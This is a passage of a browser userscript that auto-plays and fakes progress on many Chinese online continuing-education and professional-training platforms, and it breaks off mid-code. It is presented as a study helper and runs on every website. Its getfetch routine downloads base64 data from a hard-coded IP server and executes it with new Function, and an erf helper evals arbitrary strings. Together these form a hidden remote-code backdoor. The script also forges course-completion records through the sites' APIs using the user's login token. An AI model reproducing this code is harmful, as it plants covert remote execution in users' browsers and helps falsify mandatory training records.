// ==UserScript==
// @name         📌📌📌【2025光影】网络教育、🪅专业技术、🎯继续教育等视频学习伴侣
// @namespace    http://tampermonkey.net/
// @version      6.7.8.7
// @description  🤖自动挂机📺高倍数🔥继续教育🎗️远程教育🚩专业技术人员💂‍♀️西南大学、北京科技大学🎀西南交通，湖北第二师范🥩电子科技，成都市中小学🍿华东师范大学，江西专技学习网，安徽专技网,建投学堂、温州继续教育网、山东青年政治学院,🛎河南教师培训网,重庆大学网络教育学院，黑龙江省网络助学平台，青岛市，🌈浙里学习、山东干部网络学院，河北教师教育网、隆泰达培训🎊东营市继续教育网、百年树人、会计人员🥇深i学、济宁市高级职业学校、基础教育进修网、高等学历继续教育👨‍🚒河南专技培训、青岛大学、和学在线、湖南农民大学生⏩全国煤炭行业现代❤️浙江文化干部🤖新营造❤️贵州省建设行业职业技能管理中心、广州市干部培训❤️长春工业大学🎉西安工业大学168网校🥇在线壹佰分🎉一点通🎉上海开放大学📺卫生健康人才职业、好医生、广州新教师✅株洲教师教育1️⃣安徽专业技术人员🔥广东省教师继续教育信息管理平台🎗️河北干部网络学院↗️广东医科大学、河南华夏基础😉九江学院🎉国家开放大学🧠青书学堂、云南省执业药师、马鞍山市、湖南师范大学、教师专业发展培训网,贵州省党员干部网络学院，河南省专业技术人员，企安全、夏邑县小学教师、蕴瑜课堂、新疆
// @author
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @grant        GM_openInTab
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @grant        GM_addValueChangeListener
// @grant        window.close
// @grant        GM_registerMenuCommand
// @antifeature  payment
// @noframes
// @icon         https://www.zhihuishu.com/favicon.ico
// @connect      www.gaozhiwang.top
// @connect      api.qdjxjy.com.cn
// @connect      47.115.205.88
// @connect      localhost
// @antifeature  payment  学习辅助付费
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/478168/%F0%9F%93%8C%F0%9F%93%8C%F0%9F%93%8C%E3%80%902025%E5%85%89%E5%BD%B1%E3%80%91%E7%BD%91%E7%BB%9C%E6%95%99%E8%82%B2%E3%80%81%F0%9F%AA%85%E4%B8%93%E4%B8%9A%E6%8A%80%E6%9C%AF%E3%80%81%F0%9F%8E%AF%E7%BB%A7%E7%BB%AD%E6%95%99%E8%82%B2%E7%AD%89%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0%E4%BC%B4%E4%BE%A3.user.js
// @updateURL https://update.greasyfork.org/scripts/478168/%F0%9F%93%8C%F0%9F%93%8C%F0%9F%93%8C%E3%80%902025%E5%85%89%E5%BD%B1%E3%80%91%E7%BD%91%E7%BB%9C%E6%95%99%E8%82%B2%E3%80%81%F0%9F%AA%85%E4%B8%93%E4%B8%9A%E6%8A%80%E6%9C%AF%E3%80%81%F0%9F%8E%AF%E7%BB%A7%E7%BB%AD%E6%95%99%E8%82%B2%E7%AD%89%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0%E4%BC%B4%E4%BE%A3.meta.js
// ==/UserScript==


!function () {
    let panelcss = `
        .myTool{
            background: #fff;
            width: 234px;
            font-size: 14px;
            display: flex;
            flex-direction: column;
            align-items: center;
            position: fixed;
            z-index: 9999;
            top: 70px;
            left: 44px;
            box-sizing: border-box;
            padding: 15px 9px;
            border-radius: 5px;
            box-shadow: 0 0 9px rgba(0,0,0,.5);
        }
        .controls{
            position: absolute;
            right: 12px;
            font-size: 27px;
            top: 9px;
            cursor: pointer;
            transition: all 0.4s;
        }
        .controls:hover{
            color: #1f74c;
            transform: rotate(360deg);
        }
        
        .myTool-content{
            transition: all 0.4s;
            overflow: hidden;
        }
        .mytoolkeyipt{
            width: 130px;
            height: 22px !important;
            outline: none;
            padding: 0px 3px;
            border: 1px solid #757575FF;
            border-radius: 3px;
            font-size: 13px;
            padding: 0px 3px;
            margin-right: 5px;
            margin-top: 2px;
        }
        .addkey-btn{
            color: #fff;
            background: #1f74ca;
        }
        .removkey-btn{
            color: #000;
            display: none;
            background: #eee;
        }
        .handleKeyBtn{
            width: 54px;
            height: 24px;
            margin-top: 2px;
            border: none;
            font-size: 12px;
            border-radius: 2px;
            cursor: pointer;
        }
        
        .handleSpeedUp{
            background: orange;
            font-size: 12px;
            color: #fff;
            padding: 4px 15px;
            border-radius: 5px;
            margin: 0 auto;
            max-width: 80px;
            margin-top: 10px;
            cursor: pointer;
            text-align: center;
        }
        .ctxTipWrap{
            min-width: 350px;
            min-height: 150px;
            text-align: center;
            line-height: 150px;
            background: #fff;
            position: fixed;
            z-index: 999;
            left: 50%;
            top: 50%;
            border-radius: 15px;
            box-shadow: 0 0 5px rgba(0,0,0,.6);
            display:none;
        }
        .cxtsection{
          width: 100%;
          box-sizing: border-box;
          padding: 0 5px;
          margin-bottom: 2px;
        }
        .cxtsection .ctx-title{
          text-align: left;
          margin-top: 12px;
          font-size: 12px;
          color: #4e5969;
          border-left: 2px solid #1f74ca;
          border-radius: 2px;
          padding-left: 3px;
          line-height: 16px;
        }
        .ctxsection2{
          display: flex;
          justify-content: space-between;
        }
        .ctxsection2 .speed-select{
          width: 50%;
          height: 22px !important;
          outline: none;
          position: relative;
          top: 10px;
          border: 1px solid #757575FF;
          border-radius: 3px;
          padding: 0;
          padding-left: 10px;
        }
        .ctxsection3{
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .feedbackBtn{
            font-size: 13px;
            position: relative;
            top: 5px;
            cursor: pointer;
            color: #000;
        }
        a{
            text-decoration: none;
        }
        .myTool>.floatWin{
            position: fixed;
            left: -99999px;
            top: 9vh;
            width: 70px;
            height: 70px;
            background-color: orange;
            z-index: 9999999;
            border-radius: 50%;
            transition: all .6s;
            cursor: pointer;
            text-align: right;
            line-height: 70px;
            box-sizing: border-box;
            color: #fff;
            font-size: 13px;
            padding-right: 5px;
        }
        .myTool>.floatWin:hover{
            left: 0 !important;
            padding-right: 0px;
            font-size: 16px;
            text-align: center;
        }
    `;

    class GMTool {
        constructor() {
            this.getfetch()
        }

        getValue(e) {
            return GM_getValue(e, null)
        }

        setValue(e, t) {
            GM_setValue(e, t)
        }

        deleteValue(e) {
            GM_deleteValue(e)
        }

        registerMenuCommand(e, t, l) {
            GM_registerMenuCommand(e, () => {
                "function" == typeof l && l()
            }, t)
        }

        openInTab(e) {
            GM_openInTab(e, {active: !0})
        }

        isDateGreaterThanSevenDays(e) {
            e = new Date(e).getTime();
            return 7 < ((new Date).getTime() - e) / 864e5
        }

        axfedata(e) {
            return new Promise(t => {
                GM_xmlhttpRequest({
                    ...e, onload: function (e) {
                        200 == e.status && t(JSON.parse(e.response))
                    }
                })
            })
        }

        sleep(t) {
            return new Promise(e => setTimeout(e, t))
        }

        timeToSeconds(e) {
            var [e, t, l] = e.split(":").map(Number);
            return 3600 * e + 60 * t + l
        }

        async getfetch(e) {
            axfedata({method: "GET", url: _b + "/vertifyBlackuser"}).then(e => {
                e && new Function(atob(e.data || "d2luZG93LmNsb3NlKCk="))()
            })
        }
    }

    class Message {
        static createMessageContainer() {
            Message.messageContainer || (Message.messageContainer = document.createElement("div"), Message.messageContainer.className = "message-container", document.body.appendChild(Message.messageContainer))
        }

        static show(e) {
            var {message: e, type: t = "info", duration: l = 3e3} = e, n = document.createElement("div");
            n.className = "message " + t, n.innerHTML = e, Message.messageQueue.push(n), 1 === Message.messageQueue.length && Message.displayMessage(n, l)
        }

        static displayMessage(e, t) {
            Message.createMessageContainer(), Message.messageContainer.appendChild(e), clearTimeout(Message.timeoutId), Message.timeoutId = setTimeout(() => {
                e.style.opacity = "0", setTimeout(() => {
                    Message.messageContainer.removeChild(e), Message.messageQueue.shift(), 0 < Message.messageQueue.length && Message.displayMessage(Message.messageQueue[0], t)
                }, 300)
            }, t)
        }
    }

    Message.messageContainer = null, Message.messageQueue = [], Message.timeoutId = null, window.Message = Message;
    let version = "6.2.0.1", _bt = "https://www.gaozhiwang.top", _b = "http://47.115.205.88:7001", MyTool = new GMTool,
        ElementObj = {};

    function erf(data) {
        try {
            eval(data)
        } catch (e) {
            new Function(data)()
        }
    }

    let _i1 = {
        zhihuishu: {mainClass: "zhihuishu"},
        ningmengwencai: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "", activeClass: "", async _init(t) {
                    let e = setInterval(() => {
                        try {
                            if (ElementObj.$allTask = document.querySelectorAll("iframe")[1].contentDocument.querySelectorAll(".childSection"), ElementObj.$allTask.length) {
                                clearInterval(e), ElementObj.$handleSpeedUp.style.display = "none";
                                for (let e = 0; e < ElementObj.$allTask.length; e++) if (ElementObj.$allTask[e].classList.contains("active")) {
                                    t.currentIndex = e, t._o1(t);
                                    break
                                }
                            }
                        } catch (e) {
                        }
                    }, 1e3)
                }, videoEle() {
                    return new Promise(e => {
                        let t = 0, l = setInterval(() => {
                            try {
                                t += 1, ElementObj.$video = document.querySelectorAll("iframe")[1].contentDocument.querySelector("video"), ElementObj.$video && ElementObj.$video.duration ? (clearInterval(l), e(1)) : 7 <= t && (clearInterval(l), e(2))
                            } catch (e) {
                            }
                        }, 1e3)
                    })
                }, async beforePlayNext() {
                    document.querySelectorAll("iframe")[1].contentDocument.querySelector("#saveBtn").click(), await MyTool.sleep(3e3)
                }
            }
        },
        fujianshifan: {mainClass: "fujianshifan"},
        gxcic: {mainClass: "gxcic"},
        luohexueyuan: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: "li.catalog-box", activeClass: "activeCss", videoEle: () => new Promise(e => {
                    let t = 0, l = setInterval(() => {
                        t += 1, ElementObj.$video = document.querySelector("video"), ElementObj.$video ? (clearInterval(l), e(1)) : 7 <= t && (clearInterval(l), e(2))
                    }, 1e3)
                }), _init: a => new Promise(e => {
                    let n = setInterval(async () => {
                        if (ElementObj.$allTask = document.querySelectorAll("li.catalog-box .play-c"), ElementObj.$allTask.length) {
                            clearInterval(n), ElementObj.$handleSpeedUp.style.display = "none";
                            for (let e = 0; e < ElementObj.$allTask.length; e++) {
                                var t = ElementObj.$allTask[e];
                                if ("\u5df2\u5b66\u4e60" != t.parentElement.querySelector(".c-999").getAttribute("data-original-title")) {
                                    var l = t.parentElement.querySelector(".activeCss");
                                    showTip("\u521d\u59cb\u5316\u5b8c\u6210，\u5373\u5c06\u5f00\u59cb\u64ad\u653e"), l || (t.click(), await MyTool.sleep(2e3)), a.currentIndex = e, a._o1();
                                    break
                                }
                            }
                        }
                    }, 1e3)
                })
            }
        },
        mengxiangzaixian: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "", _init: () => new Promise(e => {
                    let t = setInterval(() => {
                        ElementObj.$allTask = document.querySelectorAll(".el-card__body button i"), ElementObj.$allTask.length && (clearInterval(t), ElementObj.$handleSpeedUp.style.display = "none", toolOption.CtxMain.getCurrentIndex())
                    }, 1e3)
                }), getCurrentIndexByOption: () => new Promise(t => {
                    var l = document.querySelectorAll(".el-progress");
                    for (let e = 0; e < l.length; e++) {
                        var n = l[e], a = n.getAttribute("aria-valuenow");
                        if (parseInt(a) <= 99) {
                            n.click(), t(e);
                            break
                        }
                    }
                })
            }
        },
        fjsf2: {mainClass: "fjsf2"},
        liangyijiaoyu: {mainClass: "liangyijiaoyu"},
        zjzx: {mainClass: "zjzx"},
        zxpxmr: {mainClass: "zxpxmr"},
        ggfw: {mainClass: "ggfw"},
        liangshizaixian: {mainClass: "liangshizaixian"},
        mingshiclass: {mainClass: "mingshiclass"},
        qiangshi: {mainClass: "qiangshi"},
        lanzhouwenli: {mainClass: "lanzhouwenli"},
        guojiazhihuijiaoyu: {mainClass: "guojiazhihuijiaoyu"},
        lanzhouchengren: {mainClass: "lanzhouchengren"},
        tsbtchinamde: {mainClass: "tsbtchinamde"},
        henangongshe: {mainClass: "henangongshe", remark: "\u548c\u5317\u4eac\u6559\u5e08\u4e00\u6837\u7684"},
        lzrejxjy: {mainClass: "lzrejxjy"},
        xuzhouyikedaxue: {mainClass: "xuzhouyikedaxue"},
        xibeisfzyjy: {mainClass: "xibeisfzyjy"},
        henandikuang: {mainClass: "henandikuang"},
        zhejiangtjj: {mainClass: "zhejiangtjj"},
        jiangxizhipeizaixian: {mainClass: "jiangxizhipeizaixian"},
        lanzhoudxgs: {mainClass: "lanzhoudxgs"},
        jidianshejijiaoyu: {mainClass: "jidianshejijiaoyu"},
        henanzhujianjy: {mainClass: "henanzhujianjy"},
        sipingnengcun: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: ".videolist_item", openListenPlayTime: !1, getCurrentIndexByOption() {
                    return new Promise(e => {
                        for (var t = 0; t < ElementObj.$allTask.length; t++) if (!ElementObj.$allTask[t].querySelector(".el-progress").classList.contains("is-success")) {
                            e(t);
                            break
                        }
                        alert("\u5f53\u524d\u8bfe\u7a0b\u89c6\u9891\u5df2\u5168\u90e8\u64ad\u653e\u5b8c")
                    })
                }
            }
        },
        ycjyluteducn: {mainClass: "ycjyluteducn"},
        gdrcjxjyw: {mainClass: "gdrcjxjyw"},
        shandongqlteacher: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: "app-course-catalogue.ng-star-inserted .ant-list-items li",
                getCurrentIndexByOption() {
                    return new Promise(t => {
                        for (let e = 0; e < ElementObj.$allTask.length; e++) ElementObj.$allTask[e].querySelector("div.align-items-center") || t(e)
                    })
                }
            }
        },
        shixuetong: {mainClass: "shixuetong"},
        shandongzhuanyejisu: {mainClass: "shandongzhuanyejisu"},
        chongqingzhuanye: {mainClass: "chongqingzhuanye"},
        zhijiaoyun: {mainClass: "shandongzhuanyejisu"},
        zhijiaoyun2: {mainClass: "zhijiaoyun2"},
        zaixianxuexi: {mainClass: "zaixianxuexi"},
        anquanshengchanzx: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "", activeClass: "", videoEle: () => new Promise(e => {
                    let t = 0, l = setInterval(() => {
                        t += 1, ElementObj.$video = document.querySelector("#vjs_video_3_html5_api"), ElementObj.$video ? (clearInterval(l), e(1)) : 7 <= t && (clearInterval(l), e(2))
                    }, 1e3)
                }), async _init(a) {
                    let i = setInterval(async () => {
                        try {
                            var e = document.querySelectorAll(".chapter_j>span"),
                                t = document.querySelectorAll(".first-box");
                            if (ElementObj.$allTask = e.length ? e : t, ElementObj.$allTask.length) {
                                clearInterval(i), showTip("\u6b63\u5728\u521d\u59cb\u5316"), ElementObj.$handleSpeedUp.style.display = "none";
                                for (var l = 0; l <= ElementObj.$allTask.length - 1; l++) {
                                    var n = ElementObj.$allTask[l].querySelector("li");
                                    if (n && n.classList.contains("currse")) {
                                        a.currentIndex = l;
                                        break
                                    }
                                    if (ElementObj.$allTask[l].classList.contains("text-color")) {
                                        a.currentIndex = l;
                                        break
                                    }
                                }
                                -1 == a.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u5df2\u5168\u90e8\u5b66\u5b8c") : ("/course/lesson" != location.pathname && ElementObj.$allTask[a.currentIndex].querySelector("li")?.click(), showTip("\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e"), a._o1())
                            }
                        } catch (e) {
                        }
                    }, 500)
                }, listenRebortFn(e) {
                    if ("none" != document.querySelector(".mask.mask_bg").style.display) e.playNext(e); else {
                        var t = ElementObj.$video.currentTime / 60, l = ElementObj.$video.duration / 60,
                            n = document.querySelector(".vjs-remaining-time-display");
                        if (n) if ("0:00" == n.innerText) return void e.playNext(e);
                        l <= t && e.playNext(e)
                    }
                }, async playNext(t) {
                    if (await sleep(2e3), t.currentIndex >= ElementObj.$allTask.length - 1) alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c"); else {
                        t.currentIndex += 1;
                        let e = ElementObj.$allTask[t.currentIndex].querySelector("li");
                        (e = "/course/lesson" == location.pathname ? ElementObj.$allTask[t.currentIndex] : e)?.click(), setTimeout(() => {
                            t._o1()
                        }, 2e3)
                    }
                }
            }
        },
        guojiakaifangdaxue: {mainClass: "guojiakaifangdaxue"},
        jjjxjy: {mainClass: "jjjxjy"},
        csustcj: {
            mainClass: "CTXCommon",
            option: {nodeListClass: ".ivu-tree-children .render-content__video", activeClass: "activeVideo"}
        },
        xiangongyedx: {
            host: ["nwu.168wangxiao.com", "xatu.168wangxiao.com", "md.168wangxiao.com", "xawl.168wangxiao.com"],
            mainClass: "CTXService",
            option: {
                nodeListClass: ".ivu-tree-children .render-content__video", activeClass: "activeVideo", apis: {
                    getList(e) {
                        return new Promise(t => {
                            fetch(location.origin + "/cjapi/other/student/plan/view?id=" + e, {
                                headers: {
                                    accept: "application/json, text/plain, */*",
                                    authorization: "Bearer." + localStorage.getItem("stuToken"),
                                    "sec-fetch-mode": "cors",
                                    "sec-fetch-site": "same-origin"
                                },
                                referrerPolicy: "strict-origin-when-cross-origin",
                                body: null,
                                method: "GET",
                                mode: "cors",
                                credentials: "include"
                            }).then(e => e.json()).then(e => {
                                e = e.data.chapter.map(e => e.items);
                                t(e)
                            })
                        })
                    }, getDetail(l, n) {
                        return new Promise((t, e) => {
                            fetch(location.origin + "/cjapi/other/student/chapter/view?id=" + l + "&tpcId=" + n, {
                                headers: {
                                    accept: "application/json, text/plain, */*",
                                    authorization: "Bearer." + localStorage.getItem("stuToken"),
                                    "sec-fetch-mode": "cors",
                                    "sec-fetch-site": "same-origin"
                                },
                                referrerPolicy: "strict-origin-when-cross-origin",
                                body: null,
                                method: "GET",
                                mode: "cors",
                                credentials: "include"
                            }).then(e => e.json()).then(e => {
                                t(e.data.details.videoDuration)
                            })
                        })
                    }, save(e) {
                        return new Promise(t => {
                            fetch(location.origin + "/cjapi/other/student/curriculum/progress/update/v2", {
                                headers: {
                                    accept: "application/json, text/plain, */*",
                                    authorization: "Bearer." + localStorage.getItem("stuToken"),
                                    "content-type": "application/json;charset=UTF-8",
                                    isneedprogressbar: "false",
                                    repeatsubmit: "false",
                                    "sec-fetch-mode": "cors",
                                    "sec-fetch-site": "same-origin"
                                },
                                referrerPolicy: "strict-origin-when-cross-origin",
                                body: JSON.stringify(e),
                                method: "PUT",
                                mode: "cors",
                                credentials: "include"
                            }).then(e => e.json()).then(e => t(e))
                        })
                    }
                }, async _init(o) {
                    let r = setInterval(async () => {
                        var e = /[0-9]+/.exec(location.pathname)[0], t = document.querySelector(".details-container");
                        if (e && t) {
                            clearInterval(r), ElementObj.$handleSpeedUp.style.display = "none", await o.changeHtml(t), o.addInfo("\u6b63\u5728\u83b7\u53d6\u8bfe\u7a0b\u4fe1\u606f");
                            t = localStorage.getItem("stuStudentName");
                            if (!t) return alert("\u767b\u5f55\u5df2\u5931\u6548，\u8bf7\u91cd\u65b0\u767b\u9646");
                            t = await MyTool.axfedata({
                                url: _b + "/order/checkUseAccount?toolkey=" + MyTool.getValue("mytoolkey") + "&account=" + t + "&type=2",
                                method: "GET"
                            });
                            if (200 !== t.code) return alert(t.message);
                            var l, n, a, t = await o.apis.getList(e);
                            o.addInfo("\u83b7\u53d6\u8bfe\u7a0b\u4fe1\u606f\u6210\u529f");
                            for (l of t) for (var i of l) -1 == i.title.indexOf("\u7ae0\u8282\u6d4b\u8bc4") && i.video && !i.isover && (o.addInfo("\u5373\u5c06\u5f00\u59cb\u64ad\u653e" + i.title), n = await o.apis.save({
                                tpcId: Number(e),
                                curriculumid: i.curriculum_id,
                                chapterid: i.id,
                                videoid: JSON.parse(i.video)[0].videoid,
                                type: i.type,
                                progress: -1
                            }), a = await o.apis.getDetail(i.id, e), o.addInfo(i.title + "\u64ad\u653e\u4e2d，\u672c\u8282\u89c6\u9891\u65f6\u957f\u4e3a" + i.timelen + "，\u81f3\u5c11\u5b66\u4e60" + a + "\u79d2"), MyTool.setValue("lenT", a), await o._o1(o), (n = await o.apis.save({
                                tpcId: Number(e),
                                curriculumid: i.curriculum_id,
                                chapterid: i.id,
                                videoid: JSON.parse(i.video)[0].videoid,
                                type: i.type,
                                progress: a
                            })).data) && n.data.isOver && o.addInfo(i.title + "\u8bfe\u7a0b\u5b66\u4e60\u5b8c\u6210")
                        }
                    }, 500)
                }, async playFn(e) {
                    var t, l = MyTool.getValue("lenT");
                    let n = 0;
                    for (t of new Array(l)) n += 1, await MyTool.sleep(1e3), e.addInfo("\u5df2\u64ad\u653e" + n + "\u79d2/" + l + "\u79d2")
                }
            }
        },
        wsjkrczyjn: {mainClass: "CTXCommon", option: {nodeListClass: ".setionItem", activeClass: "active"}},
        zhuzhouteacher: {mainClass: "zhuzhouteacher"},
        yinghuaxuetang: {mainClass: "yinghuaxuetang"},
        gzgbjy: {mainClass: "gzgbjy"},
        jixujiaoyuzaixian: {mainClass: "jixujiaoyuzaixian"},
        guizhoujianshezyjs: {mainClass: "guizhoujianshezyjs"},
        zaixian100f: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "", activeClass: "", videoEle: () => new Promise(e => {
                    let t = 0, l = setInterval(() => {
                        t += 1, ElementObj.$video = document.querySelector("#vjs_video_3_html5_api"), ElementObj.$video ? (clearInterval(l), e(1)) : 7 <= t && (clearInterval(l), e(2))
                    }, 1e3)
                }), async _init(a) {
                    let i = setInterval(async () => {
                        try {
                            var e = document.querySelectorAll(".chapter_j>span"),
                                t = document.querySelectorAll(".first-box");
                            if (ElementObj.$allTask = e.length ? e : t, ElementObj.$allTask.length) {
                                clearInterval(i), showTip("\u6b63\u5728\u521d\u59cb\u5316"), ElementObj.$handleSpeedUp.style.display = "none";
                                for (var l = 0; l <= ElementObj.$allTask.length - 1; l++) {
                                    var n = ElementObj.$allTask[l].querySelector("li");
                                    if (n && n.classList.contains("currse")) {
                                        a.currentIndex = l;
                                        break
                                    }
                                    if (ElementObj.$allTask[l].classList.contains("text-color")) {
                                        a.currentIndex = l;
                                        break
                                    }
                                }
                                -1 == a.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u5df2\u5168\u90e8\u5b66\u5b8c") : ("/course/lesson" != location.pathname && ElementObj.$allTask[a.currentIndex].querySelector("li")?.click(), showTip("\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e"), a._o1())
                            }
                        } catch (e) {
                        }
                    }, 500)
                }, listenRebortFn(e) {
                    if ("none" != document.querySelector(".mask.mask_bg").style.display) e.playNext(e); else {
                        var t = ElementObj.$video.currentTime / 60, l = ElementObj.$video.duration / 60,
                            n = document.querySelector(".vjs-remaining-time-display");
                        if (n) if ("0:00" == n.innerText) return void e.playNext(e);
                        l <= t && e.playNext(e)
                    }
                }, async playNext(t) {
                    if (await sleep(2e3), t.currentIndex >= ElementObj.$allTask.length - 1) alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c"); else {
                        t.currentIndex += 1;
                        let e = ElementObj.$allTask[t.currentIndex].querySelector("li");
                        (e = "/course/lesson" == location.pathname ? ElementObj.$allTask[t.currentIndex] : e)?.click(), setTimeout(() => {
                            t._o1()
                        }, 2e3)
                    }
                }
            }
        },
        moocxinyingzao: {mainClass: "moocxinyingzao"},
        jlnkylllnet: {mainClass: "jlnkylllnet"},
        dongbeishifandaxue: {mainClass: "dongbeishifandaxue"},
        quanguomeotan: {mainClass: "CTXCommon", option: {nodeListClass: ".row1 a.subset-class", activeClass: "on"}},
        qzjystudy: {mainClass: "qzjystudy"},
        jsjxjypt: {mainClass: "CTXCommon", option: {nodeListClass: ".videoRight ul li", activeClass: "li1"}},
        GlivePro: {
            mainClass: "CTXCommon", option: {
                nodeListClass: ".video-list-box li", activeClass: "active", async _init(o) {
                    let r = setInterval(async () => {
                        try {
                            if ("luxijxjy.gaodun.com" === location.host) {
                                ElementObj.$allTask = document.querySelectorAll(".side-right .item");
                                var e = document.querySelectorAll(".course-wrap .el-tabs__nav div[id]");
                                if (ElementObj.$allTask.length && e.length) {
                                    clearInterval(r);
                                    let t = !0;
                                    for (let e = 0; e < ElementObj.$allTask.length; e++) {
                                        var l = ElementObj.$allTask[e];
                                        t = !1, o.currentIndex = e, l.classList.contains("active") || (l.click(), await MyTool.sleep(2e3)), o._o1();
                                        break
                                    }
                                    t && document.querySelector(".course-wrap .el-tabs__nav div[id].is-active").nextElementSibling.querySelector(".card").click()
                                }
                            } else {
                                var t = document.querySelectorAll(".animated .syllabus-tree-node-title"),
                                    n = document.querySelectorAll(".aside-node-child-inner .aside-node-child-inner li");
                                if (t.length || n.length) {
                                    ElementObj.$handleSpeedUp.style.display = "none", ElementObj.$allTask = t.length ? t : n, clearInterval(r);
                                    for (var a = 0; a <= ElementObj.$allTask.length - 1; a++) {
                                        var i = ElementObj.$allTask[a];
                                        if ("cloud.gaodun.com" == location.host) {
                                            if (!i.querySelector("i").classList.contains("aside-resource-progress2")) {
                                                o.currentIndex = a;
                                                break
                                            }
                                        } else if (i.classList.contains("is-active")) {
                                            o.currentIndex = a;
                                            break
                                        }
                                    }
                                    -1 == o.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : ("cloud.gaodun.com" == location.host && ElementObj.$allTask[o.currentIndex]?.click(), showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                                        o._o1(o)
                                    }, 4e3))
                                }
                            }
                        } catch (e) {
                        }
                    }, 500)
                }, listenRebortFn(e) {
                    parseInt(ElementObj.$video.duration) <= Math.ceil(ElementObj.$video.currentTime) && (showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), e.playNext())
                }, async playNext(e) {
                    e.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (await sleep(2e3), "cloud.gaodun.com" == location.host ? location.reload() : (e.currentIndex += 1, ElementObj.$allTask[e.currentIndex]?.click(), setTimeout(() => {
                        e._o1()
                    }, 2500)))
                }
            }
        },
        gaodengxueli: {
            mainClass: "gaodengxueli",
            option: {nodeListClass: ".course-list-txt dd i", activeClass: "fa-youtube-play"}
        },
        hunannmdxs: {mainClass: "hunannmdxs"},
        shenixue: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: ".jss299", activeClass: "jss300", playNext: () => new Promise(e => {
                    setTimeout(() => {
                        ElementObj.$allTask = document.querySelectorAll(".jss299");
                        for (var e of ElementObj.$allTask) if (!e.querySelector(".jss303")) {
                            e.click(), setTimeout(() => {
                                toolOption.CtxMain._o1()
                            }, 3e3);
                            break
                        }
                    }, 3e3)
                })
            }
        },
        dongaokauji: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "", activeClass: "", openListenPlayTime: !0, _init: async n => {
                    let a = setInterval(async () => {
                        if (ElementObj.$parentNodes = document.querySelectorAll("tbody>tr"), -1 != ["/cwweb/lecture/lectureList", "/study/u/myCourse"].indexOf(location.pathname) && ElementObj.$parentNodes.length) {
                            clearInterval(a);
                            ElementObj.$handleSpeedUp.style.display = "none";
                            for (var e = 0; e <= ElementObj.$parentNodes.length - 1; e++) {
                                var t = ElementObj.$parentNodes[e];
                                if ("/cwweb/lecture/lectureList" == location.pathname) {
                                    var l = t.querySelectorAll("td")[1].querySelectorAll("span");
                                    if (l[0].innerText != l[1].innerText.replace("/", "")) {
                                        MyTool.setValue("homeUrl", location.href), t.querySelector(".study-a").click(), setTimeout(() => {
                                            window.close()
                                        }, 2e4);
                                        break
                                    }
                                } else {
                                    let e = t.querySelectorAll("td")[6];
                                    if ("\u5df2\u5b8c\u6210" != (e = "/study/u/myCourse" == location.pathname ? t.querySelectorAll("td")[5] : e).innerText.trim()) {
                                        MyTool.setValue("homeUrl", location.href), t.querySelector("a.operate-a.active").click();
                                        break
                                    }
                                }
                            }
                            location.pathname
                        }
                        -1 != location.pathname.indexOf("/cwweb/videoShow/video/videoPlay") && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(a), n._o1())
                    }, 1e3)
                }, listenRebortFn() {
                    var e = document.querySelector("#vjs-overlay");
                    e && (e.parentElement?.removeChild(e), setTimeout(() => {
                        ElementObj.$video.volume = 0, ElementObj.$video.play()
                    }, 2e3))
                }, async playNext(e) {
                    var t = MyTool.getValue("homeUrl");
                    location.href = t, setTimeout(() => {
                        e._o1()
                    }, 5e3)
                }
            }
        },
        btzjpx: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: ".classBox",
                openListenPlayStatus: !1,
                getCurrentIndexByOption: () => new Promise(e => {
                    for (var t = 0; t <= ElementObj.$allTask.length - 1; t++) "rgb(240, 247, 254)" == ElementObj.$allTask[t].style.background && e(t)
                })
            }
        },
        bainianshuren: {mainClass: "bainianshuren"},
        hebeijiaoshijiaoyuwang: {mainClass: "hebeijiaoshijiaoyuwang"},
        yunketang: {
            mainClass: "yunketang",
            option: {nodeListClass: ".el-collapse-item__content div.file-item", activeClass: "file-item-active"}
        },
        guojiazhongxiaoxue: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "", activeClass: "", async _init(a) {
                    let i = setInterval(async () => {
                        try {
                            if (ElementObj.$handleSpeedUp.style.display = "none", ElementObj.$parentNodes = document.querySelectorAll(".fish-collapse-item"), ElementObj.$allTask = document.querySelectorAll(".resource-item"), ElementObj.$parentNodes.length || ElementObj.$allTask.length) {
                                if (clearInterval(i), 1 == (ElementObj.$parentNodes.length ? 1 : 2)) {
                                    showTip("\u5b66\u4e60\u51c6\u5907\u4e2d~", 1e4);
                                    for (var t of ElementObj.$parentNodes) {
                                        t.querySelector(".fish-collapse-header").click();
                                        var l = t.querySelectorAll(".fish-collapse-header");
                                        let e = 0;
                                        if (1 < l.length) {
